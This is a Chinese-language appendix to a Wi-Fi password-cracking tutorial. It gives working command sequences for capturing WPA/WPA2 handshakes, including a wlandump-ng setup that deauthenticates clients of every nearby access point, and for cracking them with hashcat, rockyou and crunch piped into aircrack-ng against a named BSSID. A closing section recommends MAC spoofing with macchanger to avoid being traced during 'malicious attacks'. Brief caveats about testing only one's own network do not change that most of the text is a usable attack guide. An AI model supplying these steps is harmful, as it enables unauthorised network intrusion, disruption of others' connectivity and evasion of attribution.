# 附录
在本教程初次发布之后，来自互联网各个角落的一些人提出了意见和建议。 在努力保持原始教程简短而优美的基础上，我在这里介绍了有关他们精彩建议的信息，并添加了我自己的一些。 在这里，你可以找到以下信息：

- 在 MacOS/OSX 上破解 WI-FI
- 利用 `wlandump-ng` 抓取 handshake 
- 利用 `crunch` 生成单词列表
- 利用 `macchanger` 保护你的身份

## 在 MacOS/OSX 上破解 WI-FI

非常感谢 [@harshpatel991](https://github.com/harshpatel991) 提供本指南。下面会介绍如何使用 MacOS/OSX 自带的工具抓取 4-way handshake，然后再通过 naive-hashcat 来找出一个 WPA/WPA2 无线网络的密码。 此方法已在 OSX 10.10 和 10.12 上进行测试，不过也可能适用于其他版本。 像主教程一样，我们假设你有一个支持 [监测模式](https://en.wikipedia.org/wiki/Monitor_mode) 的[无线网卡](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html)。我们在 2012 年上半年和 2015 年中期这两款 MacBook Pro 上进行了测试，并取得了巨大的成功。

### 无线诊断工具

幸运的是，OSX 配备了一套无线诊断工具。 要打开它们，请在按住键盘上 option 键的同时，点击菜单栏中的 Wi-Fi 图标。 然后选择“打开无线诊断...”

### 测定目标网络信道

打开无线诊断程序，单击**窗口** > **扫描**。 找到目标网络，记录下其信道和宽度。

### 抓取一个 4-way handshake 

1. 在无线诊断程序打开的情况下，点击菜单栏中的**窗口** > **嗅探器**。选择你在上一步中找到的信道和宽度。
2. 现在，你需要等待有设备连接到目标网络。如果你正在自己的网络上测试（使用者应当只在自己的网络上进行测试），将任意一个无线设备重新连接就可以抓取 handshake。
3. 当你感觉已经成功抓取 handshake 时，点击停止。
4. 根据你的操作系统版本，抓取的 `.wcap` 文件将被保存到桌面或`/var/tmp/`。
5. 将抓取的文件上传到 https://hashcat.net/cap2hccapx/ 就可以将其转换为 `.hccapx` 文件。 如果你成功的抓到了 handshake ，站点将开始下载一个`.hccapx`文件。 否则将不会提示下载。

### 利用 `naive-hashcat` 破解密码

```bash
# 克隆 naive-hashcat
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# 在 MacOS/OSX 上从原代码构建程序
./build-hashcat-osx.sh

# 下载 134MB rockyou字典文件
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

最后，运行 `naive-hashcat.sh`。将 `handshake.hccapx` 名称改成你从 [hashcat.net](https://hashcat.net/cap2hccapx/) 下载的文件名称。`cracked.pot`是输出文件名称。

```
HASH_FILE=handshake.hccapx POT_FILE=cracked.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

再次感谢 [@harshpatel991](https://github.com/harshpatel991)，以及 [phillips321](http://www.phillips321.co.uk/) 关于如何在 OSX 上构建 hashcat 的[帖子](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going/)。

## 使用 `wlandump-ng` 抓取 handshake 

[@enilfodne](https://github.com/enilfodne) 提到 hachcat 社区有一个[更棒的工具](https://github.com/brannondorsey/wifi-cracking/issues/15)可以抓取 WPA 的 4-way handshakes。它是 hashcat 工具包的一部分，叫 [hcxtools](https://github.com/ZerBea/hcxtools) ，由 [ZerBea](https://github.com/ZerBea) 开发，名声已经超过了 `airdump-ng`。`wlandump-ng` 允许你一次性从每个附近的网络上全面抓取 handshake 信息，跳过 Wi-Fi 信道，以增加收集。


```bash
# 克隆 hcxtools
git clone https://github.com/ZerBea/hcxtools
cd hcxtools

# 构建并且安装
# 你将可能需要apt来安装需要的依赖
# https://github.com/ZerBea/hcxtools#requirements
make
sudo make install

# 覆盖所有失去从附近接入点失去连接的客户端并且监听重新连接
# 将wlan0替换成你的无线设备名称
wlandump-ng -i wlan0 -o capture.cap -c 1 -t 60 -d 100 -D 10 -m 512 -b -r -s 20 

# 一旦你获得了抓取的文件，你可以利用以下命令将其转换成hashcat抓取格式
cap2hccapx.bin capture.cap capture.hccapx
```

`wlandump-ng` 命令行参数（使用 `h` 标志来获得完整列表）：

- `-c 1`：从通道 1 开始的 2.4Ghz 范围（将转到13）
- `-t 60`：每个通道停留 60s（实验值较低，默认值为 5）
- `-d 100`：发送 deauth 每 100 个信标帧
- `-D 10`：每隔 10 个信标帧发送解析数据包
- `-m 512`：内部缓冲区大小，对于低资源机器使用 512
- `-b`：激活信号到最后 10 个探测请求
- `-r`：如果循环在通道 1 上，则重置 deauthentication / detachosciation 计数器
- `-s 20`：显示 20 条状态行

**警告：** 在大多数地方使用这个是不合法的。更多信息请参考[这里](https://github.com/ZerBea/hcxtools#warning)。

`wlandump-ng` 也提供了在被动模式下运行的选项，这时不会发送任何 deauth/disassociation 数据帧。 如果担心会影响到周围人使用网络（你应该是）时建议你使用这种模式。代价是你获得的 handshake 会少得多，不过用这种方法抓取不会被人察觉。

```bash
# 在被动模式下使用默认设置运行
wlandump-ng -i wlan0 -o capture.cap -p -s 20 
```

## 使用 `crunch` 生成单词列表

`crunch` 是使用给定字符串或模式的组合生成单词列表的工具。 我们可以使用 crunch 来即时生成密码列表，再通过管道传递给 `aircrack-ng` 而不必将单词列表保存到磁盘。


```bash
# 安装crunch
sudo apt-get install crunch
```

要想知道如何运行 crunch，可以从命令行运行（一旦开始发送密码，就可以按 `ctrl-c`）：

```bash
# 语法 8 8 是生成密码的最小长度和最大长度
# 01234567890 是组合/排列构成密码的一组字符
crunch 8 8 0123456789
```

```
Crunch 现在将生成以下数据量：900000000字节
858 MB
0 GB
0 TB
0 PB
Crunch 现在将生成以下行数：100000000
00000000
00000001
00000002
00000003
00000004
00000005
00000006
00000007
00000008
00000009
...
99999999
```

我们可以将 `crunch` 的输出作为 `aircrack-ng` 的输入，使用它生成的密码作为我们的单词列表。 这里我们使用 `crunch` 特殊规则字符 `%` 来表示数字。 此命令尝试破解10位电话号码的 WPA 密码（使用 crunch 即时生成的 102GB 的号码）：

```bash
# 我们也可以使用 -t "@^%,"  使用模式 '@' 替换小写 ',' － 替换大写
# '%' －替换数字以及 '^' － 替换特殊字符
# *************** 不要忘记最后的 '-'
crunch 10 10 -t "%%%%%%%%%%" | aircrack-ng -a2 capture.cap -b 58:98:35:CB:A2:77 -w -
```

感谢 [@hiteshnayak305](https://github.com/hiteshnayak305) 介绍 `crunch` 并将此次更新作为 [PR](https://github.com/brannondorsey/wifi-cracking/pull/17)。

## 利用 `macchanger` 保护你的个人信息

每当您使用 Wi-Fi 进行任何远程恶意攻击时，最好将你 Wi-Fi 设备的 MAC 地址进行伪装，避免被人通过网络流量里的设备信息找到你。

这是利用 `macchanger` 的一个小尝试：

```bash
# 下载 MAC changer
sudo apt-get install macchanger

# 关闭设备
sudo ifconfig wlan0 down

# 改变 mac
# -A 为有效的供应商分配一个随机的MAC w/a
# -r 让它真正随机
# -p 将其恢复到原始的硬件MAC
sudo macchanger -A wlan0

# 启动设备
sudo ifconfig wlan0 up
```

如果你有多张无线网卡，最好把所有的设备都改一遍。 或者当你尝试抓取 handshake 时干脆把不用的设备都关掉，尽可能少地留下痕迹。 请注意，重启后伪装的设备信息会恢复。
